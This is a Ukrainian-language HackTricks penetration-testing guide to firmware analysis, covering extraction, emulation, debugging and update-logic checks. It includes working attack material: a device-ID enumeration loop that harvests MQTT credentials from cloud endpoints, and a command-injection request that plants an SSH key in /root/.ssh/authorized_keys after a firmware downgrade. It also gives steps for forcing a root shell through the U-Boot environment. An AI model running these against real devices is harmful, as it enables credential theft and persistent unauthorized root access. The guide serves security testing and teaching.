# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Прошивка — це критично важливе програмне забезпечення, яке дозволяє пристроям працювати правильно, керуючи та забезпечуючи взаємодію між апаратними компонентами та програмним забезпеченням, з яким взаємодіє користувач. Вона зберігається у постійній пам'яті, що гарантує доступ пристрою до важливих інструкцій з моменту ввімкнення, що призводить до завантаження операційної системи. Дослідження та потенційна модифікація прошивки — важливий крок у виявленні вразливостей безпеки.

## **Збір інформації**

**Збір інформації** — критично важливий початковий етап для розуміння складу пристрою та технологій, які він використовує. Цей процес включає збір даних про:

- архітектуру CPU та операційну систему, яку він запускає
- особливості bootloader
- апаратну схему та datasheets
- метрики codebase та місця розташування вихідних кодів
- зовнішні бібліотеки та типи ліцензій
- історію оновлень та регуляторні сертифікації
- архітектурні та потокові діаграми
- оцінки безпеки та виявлені вразливості

Для цього надзвичайно корисні інструменти open-source intelligence (OSINT), а також аналіз будь-яких доступних open-source компонентів програмного забезпечення шляхом ручного та автоматизованого перегляду. Інструменти на кшталт [Coverity Scan](https://scan.coverity.com) та [Semmle’s LGTM](https://lgtm.com/#explore) пропонують безкоштовний статичний аналіз, який можна використати для пошуку потенційних проблем.

## **Отримання прошивки**

Отримати прошивку можна різними способами, кожен із яких має власну складність:

- **Безпосередньо** з джерела (розробники, виробники)
- **Зібрати** її за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використати **Google dork** запити для пошуку розміщених файлів прошивки
- Отримати доступ до **cloud storage** напряму, з інструментами на кшталт [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехопити **updates** через техніки man-in-the-middle
- **Екстрагувати** з пристрою через з'єднання як **UART**, **JTAG**, або **PICit**
- **Sniffing** запитів оновлень у комунікаціях пристрою
- Ідентифікувати та використовувати **hardcoded update endpoints**
- **Dumping** із bootloader або мережі
- **Видалити і прочитати** чіп пам'яті, коли всі інші методи не дали результату, використовуючи відповідні апаратні інструменти

### UART-only logs: force a root shell via U-Boot env in flash

Якщо UART RX ігнорується (тільки логи), ви все ще можете примусити init shell, **редагуючи U-Boot environment blob офлайн**:

1. Dump SPI flash з SOIC-8 clip + програматором (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайдіть розділ U-Boot env, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахувати CRC32 U-Boot env** для блоба.
3. Перезапишіть лише розділ env і перезавантажте; shell повинен з'явитися на UART.

Це корисно для embedded-пристроїв, де shell bootloader вимкнений, але розділ env записуваний через зовнішній доступ до флешу.

## Аналіз прошивки

Тепер, коли у вас є прошивка, потрібно витягти з неї інформацію, щоб знати, як її опрацьовувати. Різні інструменти, які ви можете для цього використовувати:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо ви не знайдете багато за допомогою цих інструментів, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо ентропія низька — малоймовірно, що він зашифрований. Якщо ентропія висока — ймовірно, що він зашифрований (або якимось чином стиснутий).

Крім того, ви можете використовувати ці інструменти для вилучення **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для інспекції файлу.

### Отримання файлової системи

За допомогою вищезгаданих утиліт, як-от `binwalk -ev <bin>`, ви повинні були змогти **витягти файлову систему**.\
Binwalk зазвичай витягує її в **папку, названу за типом файлової системи**, яка зазвичай є однією з наступних: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягнення файлової системи

Іноді binwalk **не має magic byte файлової системи у своїх сигнатурах**. У таких випадках використовуйте binwalk, щоб **знайти offset файлової системи та вирізати стиснену файлову систему** з бінарного файлу та **ручно витягти** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть наступну **dd command** для витягнення Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Як альтернативу, можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується в прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії `squashfs-root`.

- Архіви CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs з NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз прошивки

Після отримання прошивки важливо її проаналізувати, щоб зрозуміти структуру й потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу та витягання корисних даних із образу прошивки.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкової перевірки бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, аналізувати двійкові дані та зрозуміти подробиці розділів і файлових систем:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія вказує на можливе шифрування або стиснення.

Для витягнення **вбудованих файлів** рекомендовано використовувати інструменти та ресурси, такі як документація **file-data-carving-recovery-tools** та **binvis.io** для інспекції файлів.

### Витяг файлової системи

Використовуючи `binwalk -ev <bin>`, зазвичай можна витягти файлову систему, часто в каталог з назвою типу файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутні magic bytes, необхідне ручне витягнення. Це включає використання `binwalk` для визначення зсуву (offset) файлової системи, після чого командою `dd` вирізають файлову систему:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (e.g., squashfs, cpio, jffs2, ubifs), використовуються різні команди для ручного витягання вмісту.

### Аналіз файлової системи

Після витягання файлової системи починається пошук вразливостей. Увага приділяється небезпечним мережевим демонам, жорстко зашитим обліковим даним, API-ендпойнтам, функціоналу update server, нескомпільованому коду, стартовим скриптам та скомпільованим бінарникам для офлайн-аналізу.

Ключові місця та елементи для перевірки включають:

- **etc/shadow** та **etc/passwd** для облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на наявність потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Поширені вебсервери та бінарники IoT-пристроїв

Кілька інструментів допомагають виявляти чутливу інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку чутливої інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) для статичного та динамічного аналізу

### Перевірки безпеки скомпільованих бінарників

І вихідний код, і скомпільовані бінарники, знайдені у файловій системі, повинні бути ретельно перевірені на вразливості. Інструменти на кшталт **checksec.sh** для Unix-бінарників та **PESecurity** для Windows-бінарників допомагають ідентифікувати незахищені бінарники, які можуть бути експлуатовані.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Багато IoT-хабів отримують конфігурацію для кожного пристрою з cloud endpoint, який виглядає приблизно так:

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` отримується локально з device ID за допомогою жорстко зашитого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Такий підхід дозволяє будь-кому, хто дізнається deviceId і STATIC_KEY, відтворити URL і витягнути cloud config, що часто розкриває MQTT-облікові дані у plaintext та префікси тем.

Практичний робочий процес:

1) Отримати deviceId з UART boot логів

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять cloud config URL pattern і broker address, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновити STATIC_KEY і алгоритм token з прошивки

- Завантажте бінарні файли в Ghidra/radare2 і пошукайте шлях конфігурації ("/pf/") або використання MD5.
- Підтвердіть алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Отримайте token у Bash і приведіть digest до верхнього регістру:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Зібрати cloud config та MQTT credentials

- Складіть URL і витягніть JSON за допомогою curl; розпарсуйте за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживати plaintext MQTT та слабкими topic ACLs (якщо присутні)

- Використовуйте recovered credentials, щоб subscribe до maintenance topics і шукати чутливі події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перерахуйте передбачувані ID пристроїв (в масштабі, з авторизацією)

- Багато екосистем вбудовують байти OUI/виробника/product/type, за якими слідує послідовний суфікс.
- Ви можете перебирати кандидатні ID, отримувати tokens і програмно отримувати configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробою mass enumeration.
- Надавайте перевагу emulation або static analysis для відновлення секретів без модифікації target hardware, коли це можливо.


Процес emulating firmware дозволяє виконувати **dynamic analysis** як роботи пристрою, так і окремої програми. Цей підхід може стикатися з проблемами через залежності від hardware або architecture, але перенесення root filesystem або конкретних binaries на пристрій з відповідною architecture та endianness, наприклад на Raspberry Pi, або до pre-built virtual machine, може полегшити подальше тестування.

### Емуляція окремих Binaries

Для дослідження окремих програм критично важливо визначити endianness та CPU architecture програми.

#### Приклад з MIPS Architecture

Щоб emulate MIPS architecture binary, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
І для встановлення необхідних інструментів емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарів доречним вибором буде `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарів ARM процес аналогічний: для емулювання використовується `qemu-arm`.

### Повноцінна емуляція системи

Інструменти на кшталт [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші полегшують повноцінну емуляцію прошивки, автоматизують процес і допомагають у динамічному аналізі.

## Динамічний аналіз на практиці

На цьому етапі для аналізу використовують або реальний пристрій, або емульоване середовище. Важливо зберігати shell-доступ до OS та filesystem. Емуляція може не ідеально відтворювати взаємодії з апаратним забезпеченням, тому іноді потрібно перезапускати емуляцію. Аналіз має повторно перевіряти filesystem, експлуатувати відкриті веб-сторінки та мережеві сервіси, а також досліджувати вразливості bootloader. Тести цілісності прошивки критично важливі для виявлення потенційних backdoor-вразливостей.

## Техніки аналізу під час виконання

Аналіз під час виконання передбачає взаємодію з процесом або бінарником у його робочому середовищі, із використанням інструментів на кшталт gdb-multiarch, Frida та Ghidra для встановлення breakpoints та виявлення вразливостей через fuzzing та інші методи.

Для embedded-цілей без повноцінного дебагера, **скопіюйте статично зв'язаний `gdbserver`** на пристрій і підключіться віддалено:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння архітектури цілі та програмування на низькорівневих мовах. Захисти виконання бінарників у вбудованих системах зустрічаються рідко, але якщо вони є, можуть знадобитися техніки на кшталт Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніша велика алокація може викликати `__malloc_consolidate()`, тож будь-який фейковий chunk має пройти перевірки (адекватний розмір, `fd = 0`, і сусідні chunk-и вважаються "in use").
- **Non-PIE binaries under ASLR:** якщо ASLR увімкнено, але головний бінарник є **non-PIE**, адреси в `.data/.bss` стабільні. Можна націлитися на регіон, який вже нагадує валідний заголовок heap chunk, щоб спрямувати fastbin алокацію на **function pointer table**.
- **Parser-stopping NUL:** при парсингу JSON байт `\x00` у payload може зупинити парсер, одночасно зберігши контрольовані атакуючим байти в кінці для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, що викликає `open("/proc/self/mem")`, `lseek()` та `write()`, може записати виконуваний shellcode у відому мапу пам’яті та передати управління цьому коду.

## Підготовлені операційні системи для аналізу прошивок

ОС, такі як [AttifyOS](https://github.com/adi0x90/attifyos) та [EmbedOS](https://github.com/scriptingxss/EmbedOS), забезпечують попередньо налаштовані середовища для тестування безпеки прошивок з необхідними інструментами.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — дистрибутив, призначений допомогти у виконанні security assessment і penetration testing пристроїв Internet of Things (IoT). Він економить час, надаючи попередньо налаштоване середовище з усіма необхідними інструментами.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Операційна система для embedded security testing на базі Ubuntu 18.04, попередньо укомплектована інструментами для firmware security testing.

## Атаки пониження версії прошивки та небезпечні механізми оновлення

Навіть коли виробник реалізує криптографічну перевірку підпису для образів прошивки, **захист від відкату версії (version rollback) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за вбудованим public key, але не порівнює *версію* (або монотонний лічильник) образу, що прошивається, атакуючий може легітимно встановити **стару, вразливу прошивку, яка все ще має валідний підпис**, і тим самим знову ввести виправлені вразливості.

Типовий порядок атаки:

1. **Obtain an older signed image**
* Завантажити його з публічного порталу постачальника, CDN або сайту підтримки.
* Витягти його з супутніх мобільних/десктопних додатків (наприклад, всередині Android APK у `assets/firmware/`).
* Отримати його з сторонніх репозиторіїв, таких як VirusTotal, інтернет-архіви, форуми тощо.
2. **Upload or serve the image to the device** через будь-який відкритий канал оновлення:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато споживчих IoT-пристроїв відкривають *unauthenticated* HTTP(S) endpoints, які приймають Base64-закодовані firmware blob-и, декодують їх на сервері та запускають recovery/upgrade.
3. Після пониження версії експлуатуйте вразливість, яка була виправлена в новішому релізі (наприклад, фільтр command-injection, доданий пізніше).
4. За потреби прошийте назад останній образ або вимкніть оновлення, щоб уникнути виявлення після отримання персистентності.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) прошивці параметр `md5` безпосередньо підставляється в shell-команду без санітизації, що дозволяє ін'єкцію довільних команд (here – enabling SSH key-based root access). Пізніші версії прошивки ввели базовий фільтр символів, але відсутність захисту від пониження версії робить це виправлення марним.

### Вилучення прошивки з мобільних додатків

Багато постачальників вбудовують повні образи прошивки в супровідні мобільні додатки, щоб додаток міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються без шифрування в APK/APEX за шляхами на кшталт `assets/fw/` або `res/raw/`. Інструменти, такі як `apktool`, `ghidra` або навіть звичайний `unzip`, дозволяють витягти підписані образи без доступу до фізичного обладнання.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Контрольний список для оцінки логіки оновлень

* Чи належним чином захищено транспорт/аутентифікацію *update endpoint* (TLS + authentication)?
* Чи порівнює пристрій **version numbers** або **monotonic anti-rollback counter** перед прошивкою?
* Чи перевіряється образ у рамках secure boot chain (наприклад, signatures checked by ROM code)?
* Чи виконує userland code додаткові перевірки цілісності/згуртованості (наприклад, allowed partition map, model number)?
* Чи повторно використовують потоки оновлення *partial* або *backup* ту ж саму логіку валідації?

> 💡  Якщо будь-що з переліченого відсутнє, платформа, ймовірно, вразлива до атак відкату.

## Уразлива прошивка для практики

Щоб практикувати пошук вразливостей у прошивці, використовуйте наступні проекти уразливої прошивки як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Тренінги та сертифікація

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
